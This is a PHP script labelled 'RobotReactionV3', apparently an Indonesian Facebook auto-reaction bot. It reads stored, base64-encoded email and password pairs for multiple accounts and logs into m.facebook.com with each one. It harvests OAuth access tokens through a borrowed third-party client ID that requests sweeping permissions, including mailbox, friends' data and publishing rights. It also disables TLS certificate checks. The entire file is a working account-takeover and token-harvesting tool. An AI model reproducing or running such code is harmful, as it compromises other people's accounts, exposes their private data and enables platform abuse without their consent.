<?php
 /* -> RobotReactionV3 by Ifur <- */
$op=opendir('typex');
while($isi=readdir($op)){
if($isi != '.' && $isi != '..'){
$cokis=$isi;
$jadi= file_get_contents('typex/'.$cokis);
$rini = explode('×',$jadi);
$irma = $rini[1];
$eka = $rini[2];
$putus = base64_decode($irma);
$coeg = explode('~',$putus);
 $login=array(
       'email' => $coeg[0],
       'pass' => $coeg[1],
       'login' => 'Log in',
       );
cekx($irma,$login,$eka);
}
}
function cekx($cokis,$login,$eka){
$ambil=getx('https://m.facebook.com/v2.0/dialog/oauth?redirect_uri=http://account.nokia.com/acct/account/_COPY_All_URL_ACCESS_TOKEN_FROM_ADDRESS_BAR_&scope=email,publish_actions,user_about_me,user_actions.books,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,photo_upload,publish_stream,read_friendlists,read_insights,read_mailbox,read_page_mailboxes,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login&response_type=token,code&client_id=200758583311692',$cokis);
 if(preg_match("/access_token=/",$ambil)){
$token=substr($ambil,strpos($ambil,'token=')+6,(strpos($ambil,'&')-(strpos($ambil,'token=')+6)));
$me=getUrl('/me',$token);
  if($me[id]){
echo '<a href="//m.facebook.com/'.$me[id].'">'.$me[name].'</a><hr>';
  }else{
  unlink('cokisx/'.$cokis);
unlink('logx/'.$cokis.'.txt');
unlink('typex/'.$eka);
  echo $nama.' di hapus gan, Karna dia sudah mengganti Pasword/Sessi block<hr>';
 }
 }else{
   getx($login,'https://m.facebook.com/login.php',$cokis);
$file=file_get_contents('cokisx/'.$cokis);
 if(preg_match('/c_user/',$file)){
 echo 'Cookie di refresh<hr>';
}else{
  unlink('cokisx/'.$cokis);
unlink('logx/'.$cokis.'.txt');
unlink('typex/'.$eka);
echo 'error gan, ga bisa terjemahkan dimana errornya :v <hr>';
}
}
}
function getx($url,$xx=null,$cokis=null){
$me='Opera/9.80 (Series 60; Opera Mini/6.5.27309/34.1445; U; en) Presto/2.8.119 Version/11.10';
  if($cokis){
     $ch=curl_init();
        curl_setopt_array($ch,array(
           CURLOPT_URL => $xx,
              CURLOPT_RETURNTRANSFER => 1,
               CURLOPT_USERAGENT => $me,
                CURLOPT_REFERER => $xx,
                 CURLOPT_POST => 1,
                     CURLOPT_POSTFIELDS => $url,
                 CURLOPT_SSL_VERIFYPEER => true,
             CURLOPT_ENCODING => '',
        CURLOPT_COOKIEJAR => 'cokisx/'.$cokis,
   CURLOPT_COOKIEFILE => 'cokisx/'.$cokis,
));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
   $cx=curl_exec($ch);
       curl_close($ch);
          return ($cx);
             }else{
                $ch=curl_init();
                    curl_setopt_array($ch,array(
                       CURLOPT_URL => $url,
                  CURLOPT_RETURNTRANSFER => 1,
               CURLOPT_USERAGENT => $me,
                CURLOPT_HEADER => 1,
             CURLOPT_ENCODING => '',
             CURLOPT_COOKIEFILE => 'cokisx/'.$xx,
          ));
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
      $cx=curl_exec($ch);
  curl_close($ch);
     return ($cx);
}
 }

function getUrl($string,$token,$as=null){
  $plin=array(
  'access_token' => $token,
  );
  if($as){
  $mer=array_merge($plin,$as);
  }else{
  $mer=$plin;
  }
  foreach($mer as $k => $o){
  $jek[]=$k.'='.$o;
  }
  $im='?'.implode('&',$jek);
  $im=getFb($string,$im);
  $im=json_decode(auto($im),true);
  if($im[data]){
  return $im[data];
  }else{
  return $im;
  }
}
 function getFb($ah,$uh){
      $um=array(
      'graph',
      'facebook',
      'com',
      );
      $go='https://'.implode('.',$um);
      return $go.$ah.$uh;
}
function auto($url){
   $ch=curl_init();
   curl_setopt_array($ch,array(
   CURLOPT_URL => $url,
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_CONNECTTIMEOUT => 5,
   ));
   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
   $cx=curl_exec($ch);
   curl_close($ch);
   return $cx;
}

 ?>